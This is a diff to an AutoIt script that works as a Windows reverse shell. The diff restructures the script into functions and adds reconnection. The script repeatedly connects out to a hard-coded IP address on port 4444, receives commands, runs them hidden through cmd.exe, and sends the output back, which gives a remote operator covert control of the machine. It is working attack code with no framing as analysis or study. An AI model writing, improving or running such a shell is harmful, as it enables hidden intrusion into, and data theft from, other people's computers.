@@ -21,32 +21,58 @@
 #include <GUIConstantsEx.au3>
 #include <MsgBoxConstants.au3>
 
-Global $host = "103.97.127.14"
-Global $port = 4444
+Global Const $HOST = "103.97.127.14"
+Global Const $PORT = 4444
 
 Global $currentDir = @WorkingDir
+Global $socket = -1
+
+
+Func ConnectToServer()
+	While 1
+		If Ping($HOST, 250) Then
+			TCPStartup()
+			$socket = TCPConnect($HOST, $PORT)
+			If $socket <> -1 Then
+				Return $socket
+			Else
+				TCPCloseSocket($socket)
+				TCPShutdown()
+			EndIf
+		EndIf
+		Sleep(1000)
+	WEnd
+EndFunc
+
+
+Func ExecuteCommand($sCmd)
+    Local $pid = Run(@ComSpec & " /c " & $sCmd, "", @SW_HIDE, $STDOUT_CHILD)
+    Local $output = ""
+    Local $line = ""
+    While 1
+        $line = StdoutRead($pid)
+        If @error Or $line = "" Then ExitLoop
+        $output &= $line
+    WEnd
+    Return $output
+EndFunc
+
+
+$socket = ConnectToServer()
+TCPSend($socket, $currentDir & "> ")
 
 While 1
-    If Ping($host, 250) Then 
-        TCPStartup()
-        $socket = TCPConnect($host, $port)
-        If $socket <> -1 Then 
-            ExitLoop 
-        EndIf
+    If @error Or $socket = -1 Then ;wait to connect again
         TCPCloseSocket($socket)
         TCPShutdown()
+        $socket = ConnectToServer() 
+        TCPSend($socket, $currentDir & "> ") 
     EndIf
-    Sleep(1000) 
-WEnd
-
-TCPSend($socket, $currentDir & "> ")
-While 1
-    If @error Then ExitLoop
-    $recv = TCPRecv($socket, 1024)
+    Local $recv = TCPRecv($socket, 1024)
     If $recv <> "" Then
-        If StringLeft($recv, 3) = "cd " Then 
-            $dirToChange = StringTrimLeft($recv, 3)
-            $dirToChange = StringStripWS($dirToChange, 3) 
+        $recv = StringStripWS($recv, 3)
+        If StringLeft($recv, 3) = "cd " Then
+            Local $dirToChange = StringStripWS(StringTrimLeft($recv, 3), 3)
             If FileChangeDir($dirToChange) Then
                 $currentDir = @WorkingDir
                 TCPSend($socket, $currentDir & "> ")
@@ -55,14 +81,8 @@ While 1
                 TCPSend($socket, $currentDir & "> ")
             EndIf
         Else
-            $cmd = Run(@ComSpec & " /c " & $recv, "", @SW_HIDE, 2)
-            $stdout = ""
-            While @ComSpec & " /c " & $recv <> ""
-                $line = StdoutRead($cmd)
-                If @error Then ExitLoop
-                $stdout &= $line
-            WEnd
-            $ret = TCPSend($socket, $stdout)
+            Local $cmdOutput = ExecuteCommand($recv)
+            TCPSend($socket, $cmdOutput)
             TCPSend($socket, $currentDir & "> ")
             Sleep(500)
         EndIf
